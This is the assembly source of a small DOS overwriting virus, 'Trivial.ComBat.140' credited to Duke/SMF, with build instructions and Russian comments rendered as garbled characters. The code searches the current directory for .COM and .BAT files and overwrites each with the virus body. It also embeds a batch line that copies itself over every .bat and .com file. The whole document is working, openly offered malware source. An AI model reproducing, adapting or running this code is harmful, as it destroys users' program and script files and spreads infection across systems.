   ; Trivial.ComBat.140 (c) by Duke/SMF
   ; *®à ¦ ¥â ¢á¥ BAT ¨ COM-ä ©«ë ¢ â¥ªãé¥© ¤¨à¥ªâ®à¨¨.
   ; Š®¬¯¨«ïæ¨ï : tasm combat.asm
   ;              tlink combat.obj /t /x


                   .model  tiny
                   .code
                   org     100h
   virus_length    equ     finish - start      ;„«¨  ¢¨àãá 

   start:                                      ;* ç «® ¢¨àãá 
                   db      ': '                ;ˆ¬¨â¨àã¥¬ ¬¥âªã BAT-ä ©« 

                   mov     ah,4Eh              ;*®¨áª ¯¥à¢®£® ä ©« 
                   mov     dx,offset file_sp1  ;DX ãª §ë¢ ¥â   "*.com"
                   call    writer              ;‚ë§®¢ ¯®¨áª 

                   mov     ah,4Eh              ;*®¨áª ¯¥à¢®£® ä ©« 
                   mov     dx,offset file_sp2  ;DX ãª §ë¢ ¥â   "*.bat"
                   call    writer              ;‚ë§®¢ ¯®¨áª 

                   mov     ax,4c01h            ;Š®¥æ à ¡®âë
                   int     21h

                   db      '[Duke/SMF]'       ;†¨§¥® ¥®¡å®¤¨¬ë© ª®¯¨à ©â !
   ;-------------------------------------------
   writer          proc
   infect:
                   int     21h
                   jnc     infect_file         ;…á«¨ ä ©«  ©¤¥, â® ¯®à ¦ ¥¬,
                   ret                         ;¢ ¯à®â¨¢®¬ á«ãç ¥ -   ¢ëå®¤

   infect_file:
                   mov     ax,3D01h            ;Žâªàë¢ ¥¬ ä ©« ¤«ï § ¯¨á¨
                   mov     dx,9Eh              ;DX ãª §ë¢ ¥â    ©¤¥ë© ä ©«
                   int     21h

                   xchg    bx,ax               ;BX á®¤¥à¦¨â ä ©«®¢ë© handle

                   mov     ah,40h              ;”ãªæ¨ï § ¯¨á¨ ¢ ä ©«
                   mov     cl,virus_length     ;CL = áª®«ìª® ¡ ©â ¯¨á âì
                   mov     dx,offset start     ;DX =  ç «® ª®¤  ¢¨àãá 
                   int     21h

                   mov     ah,3Eh              ;‡ ªàë¢ ¥¬ ä ©«
                   int     21h

                   mov     ah,4Fh              ;*®¨áª á«¥¤ãîé¥£® ä ©« 
                   jmp     infect              ;*¥à¥å®¤   § à ¦¥¨¥

                   endp
   ;-------------------------------------------

   file_sp1        db      '*.com',0           ;Œ áª  COM-ä ©«®¢ ¤«ï ¯®¨áª 
   file_sp2        db      '*.bat',0           ;Œ áª  BAT-ä ©«®¢ ¤«ï ¯®¨áª 
   batnic          db      13,10               ;BAT-ç áâì ¢¨àãá 
                   db      '@ctty nul',13,10
                   db      'for %%g in (*.bat *.com) do copy %0 %%g',13,10
                   db      'ctty con',13,10
   finish:                                     ;Š®¥æ ¢¨àãá 
                   end     start
